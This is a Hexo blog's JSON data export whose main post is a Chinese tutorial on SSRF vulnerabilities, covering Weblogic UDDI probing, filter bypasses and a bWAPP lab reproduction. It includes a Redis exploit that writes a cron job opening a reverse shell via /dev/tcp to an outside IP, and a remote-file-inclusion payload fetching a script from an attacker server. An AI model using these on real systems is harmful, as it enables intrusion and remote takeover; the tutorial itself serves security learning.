{"meta":{"title":"Dim","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"SSRF漏洞基础（一）","slug":"ssrf-vulnerability-basis1","date":"2019-02-21T06:49:32.000Z","updated":"2019-03-19T07:43:23.394Z","comments":true,"path":"Penetration/ssrf-vulnerability-basis1/","link":"","permalink":"http://yoursite.com/Penetration/ssrf-vulnerability-basis1/","excerpt":"","text":"0x01、漏洞描述SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑，当攻击者传入一个未经验证的URL，后端代码直接请求该URL，会造成SSRF漏洞。是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统，一大利用是探测内网端口开放信息，对于内网不是Web服务的，一般是返回端口对应服务的banner信息。Weblogic SSRF漏洞出现在UDDI组件（若安装Weblogic时没有选择UDDI组件则不会有该漏洞），更准确地说是UDDI包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。例如：一个正常的请求为：www.xxx.com/a.php?image=http://www.abc.com/1.jpg若将image后的网址换成与该服务器相连的内网服务器地址，若服务器端没有对获取的参数做出严格过滤及限制，则导致可以从外部服务器获取到内部服务器一定量的数据。注：IPv4协议下的内网IP段是预留出来的。10.0.0.0-10.255.255.255；172.16.0.0-172.31.255.255；192.168.0.0-192.168.255.255 0x02、漏洞检测SSRF漏洞常出现于： (1)通过URL地址来分享网页内容； (2)图片加载与下载； (3)URL关键字如：share,url,target,disploy,link,wap,link,sre,operator,imageurl等 检测方法通常通过排除法。 (1)若有图片等，通过新打开窗口上显示的URL判断，若地址栏是http://xxx.xxx.png,则无。 (2)抓包看是否有关键字如”url=http”(如下图1所示)，再进行后续判断，（如：SSRF是服务器端发起的，若加载一个图片，在本地浏览器中还存在对图片的请求，则无）在包里修改url的信息构造不同的请求，然后观察返回的状态码来探测信息。 图1 关键字“url”上图1对127.0.0.1的80端口返回了200。再次构造请求，使HTTP请求404，如下图2所示，返回状态码500，以及构造一个端口不开放的请求，使TCP连接被拒绝。同时也返回了500，如下图3所示。说明url参数后，该服务器确实进行了请求，可以初步判断该服务器存在SSRF漏洞。图2 请求不存在的页面返回500图3 请求未开放的端口返回500关于SSRF比较清晰的挖掘思路如下图所示：图4 SSRF挖掘如果网站进行了过滤，可以尝试进行绕过，常用且简单的绕过方式 (1)可以通过添加指向任意IP域名xip.io，如10.0.0.1.xip.io实际指向的是10.0.0.1。 (2)不知道内网IP段，常用127.0.0.1进行探测，如果网站对127.0.0.1进行了过滤，实际还可以用127.255.255.255尝试进行绕过。 (3)构造302跳转服务 Weblogic SSRF检测，根据状态来进行判断，请求开放的服务时，会得到一个response，具体的如下图5所示： 图5 SSRF服务探测（猪猪侠）上述四种状态均可以相互转化，如请求未开放——&gt;请求开放，可以通过更改请求的端口号来进行探测，从而回显不同的结果通过构造http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(内网IP)&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search对其进行探测，观察其回显状态，判断是否存在目标网段，Weblogic上的SSRF最主要的是operator参数，通过修改该参数探测内网地址和内网端口。漏洞页面显示如下图所示： 图6 Weblogic SSRF漏洞页面可以看到会有回显，常见的有5种状态，如下图所示： 图7 Weblogic SSRF回显状态并不是出现了图6的页面就表示存在该漏洞，需要根据回显状态进行判断，根据给出的POC内容判断，如下图所示。如果weblogic.uddi.client.structures.exception.XML_SoapException该段存在，且IOException on sendMessage该段不存在，则给出漏洞的提示。故状态4是不存在的，同时对状态4情况下更改内网段及端口号进行探测，发现回显状态没有变化。 图8 SSRF检测POC如果在不知道内网IP段的情况下，可以进行尝试访问Setup UDDI Explorer，如果开发者配置不当，该位置会直接给出内网地址的网段。如下图所示 图9 内网IP段探测0x03 漏洞利用该漏洞虽然在各大src上都被评为低位，但这是其本身危害有限，但该漏洞强大之处在于探测信息，从而方面下一步的利用，比如获取服务banner信息，探测内网telnet，ssh，redis等。探测到利用反弹shell，可以根据https://github.com/NoneNotNull/SSRFX最常见的一种是，探测6379端口开放Redis服务，利用Gopher协议攻击内网中的Redis，常见exp如下所示：redis-cli -h $1 flushallecho -e “nn/1 * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1nn”|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save 0x04 复现 Eg：利用环境里的远程文件包含漏洞包含一个执行端口扫描代码文件，再对内网端口开放情况进行探测。 图10 漏洞网址观察图10中的Get请求，发现一个参数language=lang_en.phpGet的请求：http://127.0.0.1/bWAPP_latest/bWAPP/rlfi.php?language=lang_en.php&amp;action=go利用language参数构造payload，远程文件包含并执行扫描脚本探测内网开放端口及服务先看一下扫描脚本部分代码段 图11 端口扫描代码段首先弹窗了一段字符串，测试一下文件包含后是否有执行，然后设置了一个参数ip，该参数即是构造Payload时，在POST DATA中的值，即外网主机不能探测到的内网IP地址构造Payload如下所示：POST：http://127.0.0.1/bWAPP/rlfi.php?language=http://xxx.xxx.xxx/evil/ssrf-1.txt&amp;action=goPOST DATA：ip=127.0.0.1由于该环境均搭载在本地上，所以IP地址均为127.0.0.1，实际操作中，每个IP地址代表的含义均不同。第一个http://127.0.0.1为正常的可以访问到的网址，language是参数，参数后边构造的http://xxx.xxx.xxx为扫描代码存放的地址，实际操作中，可以自己搭服务器，将扫描代码放置在自己的服务器上进行操作。POST DATA中的ip就是内网的ip地址，也就是扫描代码扫描的IP构造Payload后执行，执行结果如下图12，13所示： 图12 弹窗首先进行了一个弹窗，文件包含漏洞确实包含了该文件并执行。扫描的端口开放情况如下图所示： 图13 探测内网端口开放情况0x05 总结Weblogic的SSRF漏洞实际利用也大同小异，最常见的都是先进行内网端口方面的探测，再根据实际端口开放情况进行后续利用。SSRF本身并不会直接造成重大影响，但绕过了防火墙进入内网结合其他攻击方式，则可以对内网安全产生严重的威胁。此份报告仅对SSRF做了基础描述整理以及漏洞复现，SSRF漏洞实际操作中的利用也花样百出，可网上进行搜集多番探索。 ——2019.2.20","categories":[],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://yoursite.com/tags/SSRF/"},{"name":"网络安全","slug":"网络安全","permalink":"http://yoursite.com/tags/网络安全/"}]},{"title":"TEST,HEXO","slug":"TEST-HEXO","date":"2019-01-22T07:58:58.000Z","updated":"2019-01-22T08:07:29.875Z","comments":true,"path":"undefined/TEST-HEXO/","link":"","permalink":"http://yoursite.com/undefined/TEST-HEXO/","excerpt":"","text":"This is a test article.","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-01-22T06:43:00.231Z","updated":"2019-01-22T06:43:00.231Z","comments":true,"path":"undefined/hello-world/","link":"","permalink":"http://yoursite.com/undefined/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}